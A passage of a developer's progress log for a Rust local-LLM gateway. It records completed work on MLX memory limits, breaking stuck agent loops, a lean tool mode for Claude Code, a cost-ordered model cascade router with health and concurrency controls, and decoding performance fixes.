the constrain-OFF fast path), per-task gateway (robust under MLX memory growth), Mistral-v0.3 dropped.

- [x] mlx-memory-cap — **DONE 2026-06-16.** Fork (`693f89ab`) exposes `set_cache_limit` /
  `set_memory_limit` / `set_wired_limit` (wrapping the mlx-c setters); rozum `cap_mlx_memory()`
  (`MlxNativeBackend::new`) sets them — `ROZUM_MLX_CACHE_GB` (default 4) + `ROZUM_MLX_MEM_GB` (default
  total RAM − 8). The cache cap is the key lever: MLX otherwise hoarded freed buffers to ~28 GB.
  **Validated:** a Qwen3-4B gateway serving 12 requests now peaks at **2.5 GB** (was ~28 GB) — the
  cache no longer accumulates, so the rc=2 cascade is gone and the shared per-model "load once" gateway
  is viable again (the per-task reload was only a workaround).

- [x] constrain-default-reconsider — **DONE 2026-06-16.** `ROZUM_MLX_CONSTRAIN` flipped back to
  **opt-in** (`=1` to enable). The `serving` JSON-repair recovers the common malformations on the fast
  path (Coder-7B agentic 2→4/5 with repair, constrain-off), so the B=1 masked decode is only worth its
  cost for the rare `","`-in-content case repair can't disambiguate.

- [x] agent-termination-nudge — **DONE 2026-06-16.** Lowered `MAX_TURNS` 30→15 and added per-task
  "you are DONE → STOP" nudges to all four coding prompts (build/test/fix/debug). The fix/debug nudges
  also tell the model that an `Edit` failing with "String to replace not found" means the change is
  **already applied** — do not retry, just verify. (See why below.)

- [x] agentic-loop-root-cause — **INVESTIGATED 2026-06-16.** Captured a real `rozum launch claude`
  transcript (Qwen3-4B, `fix` task) to answer "why can't agents stop when done?" Mechanism: the model
  applies the correct fix on its **first** `Edit` (success), then re-issues the **byte-identical** edit
  5+ more times; each now fails with `String to replace not found` (the target text is gone), and the
  weak model reads the error as "retry" rather than "already done" → it loops to `--max-turns`. It also
  **skips the verification step** (`cargo run`), so it never gets the positive "olleh" closure signal.
  Tool-call format is NOT at fault (native `<tool_call>` works). This is a small-model state-tracking
  limit: 0.5–4B loop (Llama-1B `fix` = 442 turns), Qwen3-30B-A3B does not. The run that *did* stop only
  did so by luck — the model emitted a `<tool_call>` missing its `name`, which our parser correctly
  dropped to text → `finish_reason: stop`. Levers: `max-turns` cap + prompt nudges (band-aids, shipped)
  + bigger model (architectural, in RECOMMENDED). One real model-agnostic server lever below.

- [x] agentic-loop-breaker — **DONE 2026-06-16.** Server-side, model-agnostic loop break in the gateway
  (`detect_stuck_loop` + `chat_or_loopbreak` + `synthetic_stop_stream`, all three protocol handlers route
  through it). On a detected stuck loop it returns a synthetic one-shot stream (text + `Done{EndTurn}`)
  instead of generating another doomed turn — every per-protocol serializer renders it as an ordinary
  `finish_reason: stop`, so the agent concludes. **Two signatures** (the e2e repro proved one isn't
  enough): (1) **structured** — the same tool call (name+input) repeated ≥3× with error results (Codex /
  Responses, and CC when tool use completes); (2) **text-repeat** — CC headless *interrupts* its own
  doomed tool use and records the turn as a text placeholder (`[Tool use interrupted]` / `(no content)`),
  so the gateway never sees structured tool blocks — only the same assistant text **recurring** in the
  recent window (it ping-pongs between a re-diagnosis and the interruption, so "N-in-a-row" misses it;
  the fix counts repeats in the last 6 assistant turns). **Verified e2e** (Qwen3-4B `fix`): the gateway
  logged `stuck_loop_broken`, the synthetic stop became CC's final turn, and the run ended
  `subtype=success` at 7 turns instead of looping to `--max-turns`. 5 unit tests; conservative thresholds
  = no false positives on distinct-progress conversations. (`ROZUM_DEBUG_LOOP` probe used during the
  investigation, removed.)

- [x] recommend-agentic-models — **DONE 2026-06-16.** `src/models.rs` RECOMMENDED rewritten with the
  agentic verdict: Qwen3-30B-A3B = best for local agentic coding, the 7B→27B capability cliff,
  Qwen3/Qwen3.6 native `<tool_call>` > Qwen2.5/Llama loose JSON. Dropped Mistral/SmolLM2/Phi-3/gemma×2.

- [x] cc-prompt-lean-mode — **DONE 2026-06-16.** `rozum launch --lean` strips non-coding tools from a
  launched `claude`. **Measured** the actual bloat first (Qwen3-4B, real launch): CC ships **33 tools /
  ~4,878 tool-schema tokens** every request — most non-coding (7 `mcp__rozum__*` meeting-room tools,
  `Cron*`, `Task*`, `Workflow`, `Enter/ExitPlanMode`, `Enter/ExitWorktree`, `Skill`, `Agent`,
  `ScheduleWakeup`, `LSP`, `Web*`, `NotebookEdit`). Key correction from the measurement: **`--allowedTools`
  is a *permission* whitelist, not a request shaper** (it left the count unchanged / *higher* — 35) —
  `--disallowedTools` is what removes schemas from the request. `--lean` injects `--disallowedTools` with
  the non-coding list (+ `mcp__rozum` server-wildcard) → **4 tools / ~761 tokens (−84%)**, leaving the
  Read/Write/Edit/Bash core. `apply_lean_tools` (`src/main.rs`) injects at the end of the program vector
  (variadic flag), no-op for non-`claude`, skipped if the user already manages tools; `--lean` added to
  `KNOWN_BOOL_FLAGS` so it hoists when placed after the program name. `scripts/bench/agentic.sh` now uses
  `--lean` (which covers the old `--disallowedTools AskUserQuestion`). 4 unit tests + verified e2e (claude
  still answers under the lean tool set; `--lean` ≠ regression — `fix` 3/3 with vs 3/3 without).
  **Update 2026-06-16:** `--lean` also adds `--exclude-dynamic-system-prompt-sections` — CC embeds git
  status (which changes on every file edit) in the system prefix, busting the prefix-KV cache and forcing
  a full ~1.4K-token re-prefill each turn; the flag relocates those per-machine sections into the first
  user message so the static prefix stays cached. Safe (relocates, doesn't strip the load-bearing system
  prompt). `apply_lean_tools` → `apply_lean_flags`; `fix` 4/5 with both levers, and successful runs went
  ~10 → 6 turns.

- [x] est-prompt-tokens-accurate — **DONE 2026-06-16.** `estimate_prompt_tokens(messages, tools)` replaces
  the Text-only `total_message_text`+`estimate_tokens` at all 3 handlers. The old estimate ignored prior
  tool-call args, **tool results** (file dumps / command output — often the largest blocks), and the
  **tool schemas** (~5K tokens) — under-counting an agentic turn several-fold, so the overflow preflight
  (`est > ctx_win`) could wave through a prompt that blows the model's window. Found while measuring
  `--lean` (the estimate stayed flat as the tool count swung 27→35). New estimate sums all block types +
  each tool's name+description+schema. Unit test covers tool-result + tool-schema contributions.

- [x] ~~cc-system-prompt-strip~~ — **INVESTIGATED, WON'T DO (2026-06-16).** Tried to cut the other half
  of the prompt overhead (CC's ~1,400-token system prompt). CLI levers measured: `--bare` → sys ~27 tok
  (est −71%), `--system-prompt <minimal>` → sys ~49 tok (est −48%). **Both break the agent on local
  models:** `--bare` 0/3 on `fix` (model runs but can't complete the tool loop) + flaky `build`;
  `--system-prompt` minimal 0/3 on `build`. Unlike the tool schemas (pure overhead → `--lean`), the
  system prompt is **load-bearing** — operating instructions the weak model depends on. Left intact.
  `--exclude-dynamic-system-prompt-sections` only *relocates* per-machine bits (cache reuse, not size).


(mistral-system-fold moved to BACKLOG as WON'T DO — only Mistral-v0.3 needed it, and all kept models
support the `system` role.)

#### P0 (CURRENT, 2026-06-15): cascade-router — frugal/escalation model routing

**User-driven feature.** Spec: `docs/specs/cascade-router.md` (design agreed + availability/health
folded in). Try the cheapest/fastest model first (small local → big local → cheap remote →
frontier), escalate only when the cheap answer isn't good enough, stop at the first acceptable —
cheaper than a single frontier call on average (the opposite of Fusion's parallel ensemble). Caller
supplies the candidate list (inline or a parameter-selectable named config); one model = passthrough.
Configurable + adaptive (acceptance L0 structural → L1 self-signal/escalate-tool → L2 cheap judge;
strategy AlwaysCheapest / ClassifyThenStart / Learned; learned stats). Resilient: transient model
health (quota / rate-limit / down / network / OOM) → route to the best AVAILABLE model, auto-recover,
never hard-fail. Parallel scheduler (difficulty-routed non-blocking lanes; subsumes
`concurrency-multi-instance`). Built on `BackendOrchestrator`; remote tiers = `openai_http`/
`anthropic_http`. 7 phases, each its own branch + tests + merge; early phases deterministic/model-free.

- [x] cascade-p1-core - **Phase 1. DONE 2026-06-15** (`src/cascade/`). `ModelCard {id,backend,tier}`,
  `CascadeConfig` (`models` cost-ordered, `acceptance: [StructuralCheck]`, `CascadeBudget
  {max_escalations, wall_time}`), `CascadeBackend: ChatBackend` (1 model → live passthrough; else
  cost-ordered loop: drain each attempt → L0 verdict → Accept short-circuits, Escalate→next, errored
  skipped; budget/exhaustion → best usable so far, all-failed → error). L0 `StructuralCheck`:
  error→escalate; `response_schema`/tool-args validated via `constrain`→fail→escalate; free-form→
  inconclusive (accept). `AcceptanceCheck` trait + `Verdict` + `pipeline_verdict` (first decisive
  wins; all-inconclusive→Accept). 7 model-free e2e tests (escalate-on-structural-fail, accept-cheap-
  skip-strong, passthrough, error-escalate, budget→best-so-far, free-form-cheapest, all-error→error).
  185/0. **Gateway request-surface DONE** (branch `feature/cascade-startup-wiring`): `model:
  "cascade[:name]"` + comma-lists resolve to a `CascadeBackend` from `[cascade.<name>]` in
  `rozum.toml` (or `ROZUM_CASCADE[_NAME]` JSON). Built on lazy reload all along; the last gap —
  the gateway's **cold-start** build bypassed the detection — is fixed: `try_cascade_backend` is
  the shared chokepoint for both the startup build and the reload builder, so `rozum gateway
  --model cascade:fast` boots serving the cascade (smoke-verified: startup banner, not "no
  backend") + a startup-routing integration test.
- [x] cascade-p2-health - **Phase 2. DONE 2026-06-15** (`src/cascade/health.rs`). `HealthRegistry`:
  per-model `HealthState {Healthy, Degraded(half-open), Unavailable}` + `FailReason {RateLimited,
  QuotaExhausted, Down, Network, OutOfMemory, Unknown}`; `classify(err)` maps backend error strings;
  `record_failure` sets exp-backoff (base/reason × 2^fails, capped) + jitter cooldown; `is_available`
  goes half-open when the cooldown elapses; `record_success` → Healthy. Cascade loop now skips models
  in cooldown (best-AVAILABLE routing — sideways/down), classifies an attempt error → parks the model,
  a `Network` failure parks ALL `Location::Remote` cards at once, graceful degradation (best-so-far,
  hard-fail only if nothing available/usable). `ModelCard` gained `location: Local|Remote`. 6 new
  tests (classify, park→half-open→recover, backoff; e2e: parked-skipped-next-request, network-parks-
  all-remotes→degrade-to-local, OOM-big→fall-to-smaller). 191/0.
- [x] cascade-p3-self-signal - **Phase 3. DONE 2026-06-15** (`src/cascade/self_signal.rs`). L1 plus the
  **escalation affordance** (the user's point — teach the model the skill, don't guess at refusals):
  `EscalationAffordance` injects a system-prompt instruction into every NON-top tier ("if not
  confident, don't guess — reply `[[ESCALATE: reason]]`; admitting it beats being confidently wrong"),
  and `SelfSignalCheck` (L1) escalates on the marker, an `escalate`/`consult_stronger` tool call, or an
  opt-in refusal pattern (off by default — rely on the taught signal). The marker is stripped from any
  fallback answer. `escalation_tools()` exposes `consult_stronger` as a `ToolSource` for agent mode
  (composes with `run_agent`/`MultiToolSource`). Default cascade pipeline is now `[L0 structural, L1
  self-signal]` + affordance on. 7 new tests (marker/tool/refusal detection, affordance injection,
  marker strip, tool ack; e2e marker→escalate, marker-stripped-fallback). 198/0.
- [x] cascade-p4-judge - **Phase 4. DONE 2026-06-15** (`src/cascade/judge.rs`). L2 — a pluggable
  `Judge` trait (`async score(req,ans)->0..1`) consulted ONLY when L0/L1 are inconclusive; below the
  config `threshold` → escalate. `HeuristicJudge` (free — empty/explicit-non-answer → low) and
  `ModelJudge` (a small model rates 0–10, parsed; neutral 0.5 on judge error so a flaky judge never
  blocks). `pipeline_verdict` now returns `Option<Verdict>` (None = all-inconclusive → the cascade
  runs the async judge, or accepts if no judge). Opt-in (default `judge: None`). 5 new tests
  (parse_score, heuristic surface signals; e2e judge-escalates-low-quality, no-judge-accepts,
  model-judge-from-backend). 203/0.
- [x] cascade-p5-classifier - **Phase 5. DONE 2026-06-15** (`src/cascade/classifier.rs`). A
  `Classifier` trait (`difficulty(req)->0..1`) + `HeuristicClassifier` (length, code/math/multi-step
  markers, tool count, conversation depth — user/assistant text only, so system boilerplate doesn't
  inflate). `RoutingStrategy{AlwaysCheapest (default), ClassifyThenStart}` on `CascadeConfig`;
  `start_index` maps difficulty → a proportional *entry* tier (round to nearest of `0..n-1`); the
  candidate order is start-and-up then the cheaper tiers below as availability fallbacks
  (`(start..n).chain((0..start).rev())`), so a parked entry tier still degrades. Classification moves
  only the entry point, never the ceiling — escalation works unchanged from there. `AlwaysCheapest`
  is byte-for-byte the old order (all Phase 1–4 tests stay green). 9 new tests (6 heuristic scoring,
  3 e2e: trivial→cheapest, hard→skip-cheap, hard+entry-down→fall-back-below). 212/0.
- [x] cascade-p6-scheduler - **Phase 6. DONE 2026-06-15** (`src/cascade/scheduler.rs`). Residency
  lanes: a `Lane{Pool(name), Free}` per `ModelCard` (`Lane::default_for`: every local → one shared
  `"local"` pool, every remote → `Free`) + a `LaneSet` of one semaphore per pool. The cascade
  `enter`s a model's lane before each attempt and holds the permit only for that attempt (freed on
  escalation), so co-residents serialize (single-resident = 1 slot) while a request in a *different*
  lane — or any remote — never blocks. Multi-resident is the same code with `residency_slots[pool] >
  1`. Sits above per-backend `concurrency::admit_wrap`. All existing single-request tests are
  unaffected (locals share one 1-slot pool, but they run sequentially within a request anyway). 6
  new tests (5 LaneSet unit: distinct-pools-parallel, same-pool-serialize-then-free,
  Free-ungated, multi-resident-slots, default-lane-map; 1 e2e: a simple + a hard request on distinct
  lanes meet at a shared barrier ⇒ proven concurrent). 218/0.
- [x] cascade-p7-learned - **Phase 7. DONE 2026-06-15** (`src/cascade/stats.rs`). The learned-stats
  data layer: `TaskClass` (`{Freeform,Structured,ToolUse} × {Easy,Medium,Hard}`), an `AttemptRecord`
  per model attempt (accepted/escalated, latency, tokens, judge-score, `FailReason`, **+ concurrency
  level + a `ResourceSnapshot`** for the Phase-9 curve), a `StatsStore` (JSONL append-only +
  replay-on-open like `memory_store`; in-memory aggregates per `(task-class, model)` with EWMA
  latency/score + accept-rate). New `RoutingStrategy::Learned`: `start_index` enters at the cheapest
  tier whose historical accept-rate ≥ `learned_accept_threshold` (0.6) with ≥ `learned_min_attempts`
  (5) of evidence, else falls back to `ClassifyThenStart`. The cascade now records every attempt
  (opt-in `config.stats`). 8 new tests (5 unit: task-class buckets, accept-rate fold, learned-skip,
  needs-evidence, JSONL persist/replay; 3 e2e: learned-skips-cheap, learned-falls-back, records-into-
  stats). 226/0. **Deferred within the learned track** (not blocking): adaptive judge thresholds and
  health-pattern persistence feeding the backoff/proactive-deprioritization — small follow-ups on top
  of this store.
- [x] cascade-p8-exec-feedback - **Phase 8. DONE 2026-06-15 (user idea)** (`src/agent.rs`).
  Execution-feedback escalation in the agent loop: `run_agent_escalating(tiers, …, policy)` drives a
  **cost-ordered list of backends** and, when the current model keeps producing *failing* tool calls,
  hands off to the next tier — which inherits the full transcript (errors included) and corrects it.
  `ExecFeedbackPolicy{escalate_after_error_steps}` (default 2): N **consecutive** all-errored steps →
  escalate; any progress resets. The grounded "did it actually work" signal (a `ToolError` is ground
  truth the answer was wrong) — which the bare per-response cascade can't see (it returns before
  tools run). `ToolInvocation` gained `tier`; `AgentOutcome` gained `final_tier` +
  `tool_error_rate_by_tier()` (the per-tier `(errors, total)` bridge a caller maps tier→model to feed
  the P7 learned stats). `run_agent` is now a one-line wrapper (single tier, never escalates → all
  prior behavior unchanged). 3 new tests (escalate-on-persistent-errors, no-escalation-on-recovery,
  single-backend-stays-tier-0). 229/0.
- [x] cascade-p9-adaptive-concurrency - **Phase 9. DONE 2026-06-15 (user idea)**
  (`src/concurrency.rs`). `AdaptiveConcurrency` — a per-model **AIMD** controller (TCP-style): probe
  the admission limit up by one after `probe_after` clean runs (additive), multiplicatively back off
  (`backoff`, default ×0.5) the moment a model shows load. `ConcurrencySample{overload, headroom,
  latency_ratio, ok}` carries the user's signals — a load failure (429/quota/OOM), thin local
  resource headroom (back off *before* OOM), a latency cliff, and **quality-as-a-function-of-
  concurrency** (a failed answer is red only *above* the floor; serial isn't a concurrency problem).
  `record(model, sample) → new target`; push it onto the already-resizable `AdmissionScheduler::
  set_limit` (the actuator). Starts serial and opens up only as evidence accumulates — measured, not
  assumed. Composes with Phase-6 lanes for free: effective width = `min(adaptive limit, lane
  residency share)` (two independent gates in the pipeline, no extra code). 6 new tests (probe-up,
  back-off-on-overload, floor-holds, headroom+latency reds, quality-red-only-above-floor, drives-a-
  real-scheduler). 235/0. **Live feeding deferred to gateway integration**: classify each request's
  `FailReason`/`ResourceSnapshot`/exec-feedback into a sample and apply `set_limit` per model
  (lands with the cascade request-surface wiring).
- [x] cascade-gateway-wiring - **DONE 2026-06-15** (`src/cascade/spec.rs` + `src/main.rs`). Expose
  the cascade through the gateway: `model: "cascade"` / `"cascade:<name>"` now builds a
  `CascadeBackend`. A serializable `CascadeSpec`/`TierSpec` + `build_cascade(spec, resolver)` (the
  cascade stays decoupled — the resolver builds each tier: locals via `build_from_config`, remotes
  via the OpenAI-compatible HTTP backend with the env-named API key). Unbuildable tiers (missing key
  / endpoint) are **skipped**, not fatal; only an all-empty cascade errors. Named specs load from
  env JSON (`ROZUM_CASCADE` / `ROZUM_CASCADE_<NAME>`). `parse_cascade_model` routes the model string;
  `Location` is now serde. 6 new tests (parse cases, JSON round-trip, build-in-order, skip-on-fail,
  empty-is-error, pool-override). 241/0. **Remaining follow-ups**: Anthropic-native remote tier
  (v1 is OpenAI-compatible only); a `rozum.toml [cascade]` schema (v1 is env JSON).
- [x] cascade-adaptive-live - **DONE 2026-06-15** (`src/concurrency.rs`). The P9 live feed +
  **AIMD ⇄ circuit-breaker reconciliation**. The breaker and the AIMD controller both moved the
  admission `limit` — they'd fight. Fix: the controller now owns the **ceiling** (`set_ceiling` sets
  both `capacity` and the live `limit`), and the breaker (`trip`/`recover_step`) operates as a fast
  inner loop *within* `[1, ceiling]` — an acute OOM still drops `limit` instantly, but recovery
  can't climb above what the controller has learned the model sustains. `AdmittingBackend` gained an
  opt-in `AdaptiveConcurrency`: each completed request feeds a `ConcurrencySample` (clean → probe up;
  overload/error → back off via `set_ceiling`). Adaptive backends **start serial** and open up on
  healthy traffic. Enabled by `ROZUM_ADAPTIVE_CONCURRENCY=1` in `admit_wrap` (default off → static
  budget unchanged). 4 new tests (ceiling-bounds-recovery, ceiling-raises/lowers, probe-up,
  back-off-on-OOM). 245/0.
- [x] cascade-adaptive-signals - **DONE 2026-06-15** (`src/concurrency.rs`, `src/backend.rs`,
  `src/cascade/mod.rs`). Richer P9 signals beyond overload+success: (1) **latency** — the
  `AdmittingBackend` times each request and tracks a low-concurrency `ms/token` baseline (EWMA); a
  loaded request's `per_token/baseline` becomes the `latency_ratio`, so saturation (a latency cliff)
  backs the ceiling off. Cost-normalized (per-token) + a min-token floor so prefill-dominated tiny
  outputs don't add noise. (2) **quality** — a new `ChatBackend::report_quality(ok)` (default no-op;
  the `AdmittingBackend` overrides it) lets a higher layer feed the grounded verdict; the cascade
  calls it after each acceptance verdict, so a model whose answers are rejected *under concurrency*
  backs off ("quality drops under load" closed into the live loop) — no cross-layer registry needed,
  the backend owns its controller. 4 new tests (latency_signal baseline/ratio, latency-cliff
  back-off, report_quality back-off). 248/0.
- [x] cascade-adaptive-headroom - **DONE 2026-06-15** (`src/concurrency.rs`). The last P9 signal:
  **resource headroom**. `system_memory_headroom()` — a std-only, cached (~1s) macOS probe (`vm_stat`
  free+inactive+speculative+purgeable / `sysctl hw.memsize`) → free-RAM fraction `[0,1]`. The
  `AdmittingBackend` feeds it on every completed request; below the controller's `min_headroom`
  (0.15) the ceiling backs off **before** an OOM, not after. Unified memory → one system-wide figure
  covers all local backends; probe lives in the feature-free concurrency layer (no MLX coupling) and
  is **injectable** (`with_headroom_probe`) for a GPU-specific probe later / deterministic tests. 2
  new tests (low-headroom-holds-serial, probe-is-a-sane-fraction). 250/0. **`ConcurrencySample` is
  now fully fed** — overload, success, latency, quality, headroom.
- [x] cascade-anthropic-tier - **DONE 2026-06-15** (`src/cascade/spec.rs` + `src/main.rs`).
  Anthropic-native remote tier so a cascade can use Claude as the strong tier over `/v1/messages`
  (not just an OpenAI-compatible proxy). `TierSpec` gained `api: RemoteApi {Openai (default),
  Anthropic}`. `build_remote_tier` now branches: `anthropic` → `AnthropicHttpBackend` (default
  endpoint `https://api.anthropic.com`, key from `ANTHROPIC_API_KEY` — required, tier skipped if
  absent); else OpenAI-compatible (key from `OPENAI_API_KEY`). `api_key_env`/`endpoint` override the
  defaults. 2 new tests (api in JSON round-trip, api reaches the resolver). 251/0. **Remaining
  follow-up**: a `rozum.toml [cascade]` schema (v1 is env JSON).
- [x] cascade-p7-adaptive - **DONE 2026-06-15** (`src/cascade/{stats,health,mod}.rs`). The last two
  Phase-7 pieces. (1) **Adaptive judge threshold**: `StatsStore::is_trusted(task, model, …)` →
  `CascadeBackend::effective_judge_threshold` lowers the L2 judge threshold by `judge_trust_discount`
  (0.1) for a `(task-class, model)` whose historical accept-rate has earned trust — so we stop
  wasting escalations second-guessing a proven model; an unproven one keeps the base threshold. (2)
  **Health-pattern persistence**: `HealthRegistry::open(path)` replays a JSONL of health transitions
  (`HealthEvent` = failure + wall-clock cooldown deadline / recovery); a still-active cooldown is
  restored on start (the `Instant` rebuilt from the persisted unix deadline) with its `fails` count,
  so a quota-exhausted remote stays parked across a restart instead of being re-probed, and backoff
  keeps escalating. `CascadeConfig` gained `judge_trust_discount` + `health_path` (both opt-in,
  default off). 4 new tests (judge trusts/holds, cooldown-survives-restart, recovered-available).
  255/0.
- [x] cascade-model-list - **DONE 2026-06-15** (`src/cascade/spec.rs`, `src/models.rs`,
  `src/main.rs`). The **simple** cascade path: just list models, rozum auto-orders + auto-policies.
  `from_model_list(names)` classifies each name (`classify_model_name`: `claude…`→Anthropic,
  `gpt…/o1…`→OpenAI, else local) and **auto-orders** cheapest→most-capable (locals by parameter
  size — MoE by *active* params, ignoring the `Nbit` quant suffix — then remotes by provider tier),
  strategy defaults to `classify`. Wired two ways: (1) a comma-separated `model` string
  (`--model "qwen3-4b,claude-haiku-4-5,gpt-4o"` or the request's `model`) → `build_cascade_from_list`
  → auto-cascade; (2) the **launch picker now lists hosted Anthropic + OpenAI models**
  (`models::RECOMMENDED_REMOTE`) alongside locals and supports **multi-select** (e.g. `2 9 4`) →
  joined into a cascade. `build_remote_tier` now defaults the OpenAI endpoint
  (`https://api.openai.com/v1`). 2 new tests (provider detection, cheapest-first ordering). 258/0.
- [x] cascade-cli-ergonomics - **DONE 2026-06-15** (`src/main.rs`, `src/cascade/spec.rs`). `--model`
  is now **repeatable** on `launch`/`gateway` (`Vec<String>`): `--model a --model b` ≡ `--model a,b`
  (each value may itself be a comma list; `join_models` flattens both → the auto-cascade path). New
  **`--strategy`** flag (`classify`/`learned`/`alwaysCheapest`) flows via `ROZUM_CASCADE_STRATEGY`
  (the spawned daemon inherits it) and `build_cascade_from_spec` overrides the spec's start-tier
  strategy with it. `StrategyName::parse_cli` (case/separator-insensitive). 1 new test. 259/0.
- [x] cascade-toml-config - **DONE 2026-06-15** (`src/config.rs` + `src/main.rs`). Named cascade
  configs in `rozum.toml` via `[cascade.<name>]` tables (a `CascadeSpec`: `strategy`,
  `max_escalations`, `[[cascade.<name>.tiers]]`). `model: "cascade"` → `default`, `"cascade:<name>"`
  → `<name>`. `RuntimeConfig.cascades` + `cascade_spec(name)`; `main.rs::load_cascade_spec` prefers
  the TOML table, falling back to the env JSON (`ROZUM_CASCADE[_<NAME>]`) — so config survives a
  restart without exporting env vars. `TierSpec`/`CascadeSpec`/`StrategyName` gained `PartialEq/Eq`
  (RuntimeConfig is `Eq`). 1 new test (parses named cascade tables + default lookup). 256/0. **This
  closes the cascade-router** — all phases, gateway wiring, full adaptive signal set, learned track,
  Anthropic tier, and TOML config shipped.

#### Quick wins (2026-06-15)

- [x] ci-smoke - **DONE** (`.github/workflows/ci.yml`). There was **no CI**. Added a GitHub Actions
  smoke gate on `master` push/PR: `cargo build --lib --bin rozum` + `cargo test --lib` (feature-free,
  no Xcode/Metal) on `macos-latest`, with cargo caching + in-progress cancellation. Protects the
  pure-Rust core (SPI, gateway, agent, cascade, concurrency, config — 260 tests).
- [x] docs-bootstrap - **DONE** (`README.md`). The README was meeting-room only (0 mentions of the
  gateway/`launch`/cascade). Added a "Local LLM gateway & model cascade" quickstart (gateway, launch,
  picker, the cascade model-list + `--strategy`), refreshed the project layout (gateway/cascade/
  concurrency/agent/config modules) and the dev section (feature-free tests = what CI runs).
- [x] concurrency-cost-tokenizer - **DONE 2026-06-15** (`src/concurrency.rs`, `src/backend.rs`).
  Admission cost is tokenizer-pluggable: `RequestCost::estimate(req, count_tokens)` + a
  `ChatBackend::count_tokens(text) -> Option<usize>` hook (default None; `AdmittingBackend` passes
  `self.inner.count_tokens`). Fixed the fallback heuristic from **bytes** (`str::len()/4`) to
  **chars** (`chars().count()/4`) — the old one over-costed Cyrillic/non-ASCII ~2× and skewed SJF
  ordering — and it now sums tool-result + tool-call blocks. 3 tests. 270/0.
- [~] concurrency-multi-instance - **Core (shared GPU gate) DONE 2026-06-15** (`src/concurrency.rs`).
  A process-wide GPU gate (`global_gpu_gate`, semaphore sized to `DEFAULT_SEQS_CEILING`; `ROZUM_GPU_GATE`
  overrides, `0` disables) every local `admit_wrap`-ped backend acquires *after* its per-model slot —
  so concurrent prefills across **distinct resident models** can't oversaturate one GPU. No priority
  inversion (admit-then-gate), composes with cascade lanes + adaptive ceiling, no-op for a single
  resident (gate ≥ cap) → safe default-on. 2 tests. 272/0. Size-class routing = cascade lanes +
  multislot residency; shared memory budget = multislot Phase 2.
- [~] portability-platform-features - **Durable core DONE + CI-enforced 2026-06-15** (`ci.yml`,
  `Cargo.toml`). `cargo build --no-default-features` builds + tests the non-backend durable layer
  (SPI/gateway/agent/cascade/concurrency/config/meeting — 271 tests) with no native toolchain; a CI
  `linux-core` job (`ubuntu-latest`) enforces it every push. Gated one MLX-only test module on the
  feature. Remaining (needs a Linux box): bare `cargo build` on Linux — native backends are
  Metal-bound (mlx-sys + `llama-cpp-2 metal`); → `portability-cuda-gguf`. Also closed C-category
  no-longer-developed items (candle / gguf-tool-use / preemption / superseded stubs).
- [x] shared-gateway-service - **DONE 2026-06-15** (`src/service.rs` + `src/main.rs`). `rozum service
  {install,uninstall,status}` registers the gateway as an always-warm user service (launchd / `systemd
  --user`) instead of lazy spawn + idle-exit. `--model` repeatable/cascade + `--port/--n-ctx/--offline/
  --strategy`; `ROZUM_CASCADE`/`ROZUM_CONFIG` captured. Pure plist/unit generation in the tested
  `service` module (4 tests); binary drives `launchctl`/`systemctl` (operator-validated). Also
  re-closed `streaming-output` (lost backlog doc-edit). 282/0.
- [x] docs-hygiene - **DONE 2026-06-15.** Two doc items. `portability-new-backend-checklist`: the
  add-a-backend recipe written down (`docs/specs/portability-and-the-backend-spi.md`). `prompt-policy`:
  a documented decision (`docs/specs/prompt-policy.md`) — the gateway is a transparent provider, no
  injected per-model prompts (raw is the only mode; per-model persona lives in the caller).
- [~] shared-gateway-multislot - **Phase 1 (decision core) DONE 2026-06-15 (user idea)**
  (`src/resident.rs`). Adaptive memory-gated residency: small requested models that fit and are
  *statistically useful* (frequency × recency) stay co-resident without thrashing; the least-useful
  idle model is evicted to make room; a model too big to co-reside falls back to a swap (unavoidable
  thrash) — "pick the best arrangement possible under the memory budget". `UsageStats` (persisted
  JSONL, `ModelUsage::utility` = count × recency-decay) + the pure `plan_residency` planner
  (keep-highest-utility-that-fits, busy never evicted, `oversubscribed` = swap case). 7 tests. 267/0.
  **Phase 2 IMPLEMENTED 2026-06-15** (mock-tested; `src/gateway.rs`): an **additive warm cache**
  alongside the untouched single-resident core, **on by default** (user's choice; `ROZUM_MULTISLOT=0`
  opts out), a **strict no-op for single-model traffic**. `enter(req.model)` routes a *different*,
  warmable model (known cached local that fits) to a warm secondary resident built via the existing
  builder; admit/evict via `plan_residency`; warm entry has its own inflight (decoupled from the
  primary drain); idle-only eviction with `spawn_blocking` drop; any miss falls back to the primary.
  4 tests (serve-second, fall-back-too-big, skip-unknown, evict-idle). Plus **idle-timeout warm
  eviction** (`sweep_idle_warm` in the watchdog frees a warm model idle past `unload_idle_secs`; each
  entry tracks its own last-activity, busy never swept) and **persisted `UsageStats`**
  (`$XDG_STATE_HOME/rozum/gateway/warm-usage.jsonl`). 6 tests. 278/0. **Real-model validation pending**
  (two real models co-resident, eviction frees RAM — operator runs it).
- [x] cascade-offline - **DONE 2026-06-15 (user idea)** (`src/main.rs`). `--offline` on
  `launch`/`gateway` (→ `ROZUM_OFFLINE`, inherited by the spawned daemon): `build_remote_tier` skips
  every remote tier (dropped like any unbuildable tier — locals survive, an all-remote cascade
  errors), and the launch picker hides the cloud entries (Anthropic + OpenAI). Use only local models.

#### P0 (NEXT): gateway-cc-codex — reliable local-LLM provider for Claude Code & Codex

**Sprint goal #2.** The outward gateway exists (`src/gateway.rs`: `/v1/chat/completions`
OpenAI + `/v1/messages` Anthropic + `/v1/models` + `/control/*`). Make it a *reliable*
drop-in for Claude Code and Codex against the in-process MLX/GGUF engine.
- [x] gateway-prod-perf-verify — DONE. Static: default `build_gateway_backend` routes
  Qwen3.6 → native MLX → `LoadedModel::load` sets `ROZUM_MLX_RETAIN` (hybrid), so the
  +2.7× win is live on `/v1/chat/completions` + `/v1/messages`. Guard: `is_hybrid_model`
  extracted + `hybrid_models_need_retain` unit test (fast suite). Runtime: new perf test
  `mlx_moe_backend_chat_tps` drives the full `MlxNativeBackend.chat`. **FINDING: prod path
  61.8 t/s vs the raw `model.forward` bench ~88 — ~30% lost to per-token detok** (see next).
- [x] **gateway-streaming-detok** — DONE, but MISDIAGNOSED → real fix was pipelining.
  Profiled the prod path (`ROZUM_DETOK_PROFILE`): **detok = 0.03 ms/tok** (negligible),
  the ~30% gap was the **per-token GPU sync** (`eval` + `token.item()` readback) run
  SERIALLY. `Qwen35`/`Qwen35Moe` still passed `pipeline=false` on a stale "kernel
  blocking-evals per call" assumption — the retain fix removed that eval (bench
  `serial==pipe` MATCH). Flipped both to `pipeline=true` (overlaps the next token's
  forward with the current readback): **prod `backend.chat` 62/72 → 96.2 t/s**, sync
  14 ms → 0; byte-exact (hybrid 27B + MoE chat pass). Perf-test floor bumped to 80 t/s
